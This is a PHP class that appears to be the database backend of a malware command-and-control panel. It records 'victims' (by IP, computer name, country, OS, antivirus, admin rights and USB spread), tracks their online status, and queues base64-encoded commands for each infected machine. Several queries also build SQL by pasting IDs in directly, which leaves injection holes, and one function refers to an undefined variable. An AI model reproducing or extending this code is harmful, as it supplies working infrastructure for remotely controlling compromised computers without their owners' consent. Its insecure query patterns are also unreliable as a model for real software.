<?php 

class Clients extends Database{
	public function newClient(array $clientdata){
		try {
			if ($this->isExist($clientdata['vicid'],"clients")) {
				$this->updateClient($clientdata);
			} else {
			$pdo = $this->Connect();
			$sql = "INSERT INTO clients(vicid,ipaddress,computername,country,os,insdate,antivirus,status,is_usb,is_admin) VALUES(:vicid,:ip,:cpname,:cont,:os,:insdate,:av,:stats,:usb,:admin)";
			$stmt = $pdo->prepare($sql);

			$stmt->execute($clientdata);
			$this->createCommand($clientdata['vicid']);
			return 'Client Created';
		  }
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function removeClient($clientID){
		try {
			$this->removeCommands($clientID);
			$pdo = $this->Connect();
			$sql = "DELETE FROM clients WHERE vicid IN ($clientID)";
			$stmt = $pdo->prepare($sql);
			$stmt->execute();
			return 'Client Removed';
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function updateClient(array $clientdata){
		try {
			$pdo = $this->Connect();
			$sql = "UPDATE clients SET
			vicid = :vicid,
			ipaddress = :ip,
			computername = :cpname,
			country = :cont,
			os = :os,
			insdate = :insdate,
			antivirus = :av,
			status = :stats,
			is_usb = :usb,
			is_admin = :admin WHERE vicid = :vicid";
			$stmt = $pdo->prepare($sql);
			$stmt->execute($clientdata);
			return 'Client Updated';
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function isExist($clientID,$table_name){
		try {
			$pdo = $this->Connect();
			$sql = $pdo->prepare("SELECT * FROM " . $table_name . " WHERE vicid = :id");
			$sql->execute(['id'=>$clientID]);
			if ($sql->rowCount()) {
				return true;
			} else {
				return false;
			}
		} catch (\Throwable $th) {
			//throw $th;
		}

	}

	public function getClients(){
		try {
			$pdo = $this->Connect();
			$sql = "SELECT * FROM clients";
			$stmt = $pdo->prepare($sql);
			$stmt->execute();
			$data = $stmt->fetchAll();
			return $data;
		} catch (\Throwable $th) {
			//throw $th;
		}
	}


	public function countClients(){
		try {
			$pdo = $this->Connect();
			$sql = "SELECT COUNT(*) FROM clients";
			$stmt = $pdo->prepare($sql);
			$stmt->execute();
			$data = $stmt->fetchColumn();
			return $data;
		} catch (\Throwable $th) {
			//throw $th;
		}
	}


	public function getClient($vicID){
		try {
			$pdo = $this->Connect();
			$sql = "SELECT * FROM clients WHERE vicid = :id";
			$stmt = $pdo->prepare($sql);
			$stmt->execute(['id' => $vicID]);
			$data = $stmt->fetch();
			return $data;
		} catch (\Throwable $th) {
			//throw $th;
		}
	}


	public function countOnlineClients(){
		try {
			$pdo = $this->Connect();
			$sql = "SELECT COUNT(*) FROM clients WHERE status = :status";
			$stmt = $pdo->prepare($sql);
			$stmt->execute(['status' => 'online']);
			$data = $stmt->fetchColumn();
			return $data;
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function countOfflineClients(){
		try {
			$pdo = $this->Connect();
			$sql = "SELECT COUNT(*) FROM clients WHERE status = :status";
			$stmt = $pdo->prepare($sql);
			$stmt->execute(['status' => 'offline']);
			$data = $stmt->fetchColumn();
			return $data;
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function countClientByUSB()
	{
		try {
			$pdo = $this->Connect();
			$sql = "SELECT COUNT(*) FROM clients WHERE is_usb = :usb";
			$stmt = $pdo->prepare($sql);
			$stmt->execute(['usb' => 'yes']);
			$data = $stmt->fetchColumn();
			return $data;
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function updateStatus($vicID,$status){
		try {
			$pdo = $this->Connect();
			$sql = "UPDATE clients SET status = :stats WHERE vicid IN ($vicID)";
			$stmt = $pdo->prepare($sql);
			$stmt->execute(['stats'=>$status]);
			return 'Updated';
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function getCommand($vicID){
		try {
			$pdo = $this->Connect();
			$sql = "SELECT * FROM commands WHERE vicid = :id";
			$stmt = $pdo->prepare($sql);
			$stmt->execute(['id' => $vicID]);
			$data = $stmt->fetch();
			return $data;
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function updateAllStatus($status){
		try {
			$pdo = $this->Connect();
			$sql = "UPDATE clients SET status = :stats";
			$stmt = $pdo->prepare($sql);
			$stmt->execute(['stats'=>$status]);
			return 'Updated';
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function createCommand($vicID){
		try {
			if ($this->isExist($vicID,"commands")) {
				$this->updateCommands("'" . $vicid . "'",base64_encode("Ping"));
			} else {
				$pdo = $this->Connect();
				$sql = "INSERT INTO commands(vicid,command) VALUES(:vicid,:cmd)";
				$stmt = $pdo->prepare($sql);
				$stmt->execute(['vicid'=>$vicID,'cmd'=>base64_encode("Ping")]);	
			}
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function updateCommands($vicID,$command){
		try {
			$pdo = $this->Connect();
			$sql = "UPDATE commands SET command = :cmd WHERE vicid IN ($vicID)";
			$stmt = $pdo->prepare($sql);
			$stmt->execute(['cmd'=>$command]);	
		} catch (\Throwable $th) {
			//throw $th;
		}
	}

	public function removeCommands($vicID){
		try {
			$pdo = $this->Connect();
			$sql = "DELETE FROM commands WHERE vicid IN ($vicID)";
			$stmt = $pdo->prepare($sql);
			$stmt->execute();
			return 'Client Removed';
		} catch (\Throwable $th) {
			//throw $th;
		}
	}


	public function countClientByCountry($code){
		$pdo = $this->Connect();
		$sql = "SELECT COUNT(*) FROM clients WHERE country = ?";
		$stmt = $pdo->prepare($sql);
		$stmt->execute([$code]);
		$data = $stmt->fetchColumn();
		return $data;
	}
}
?>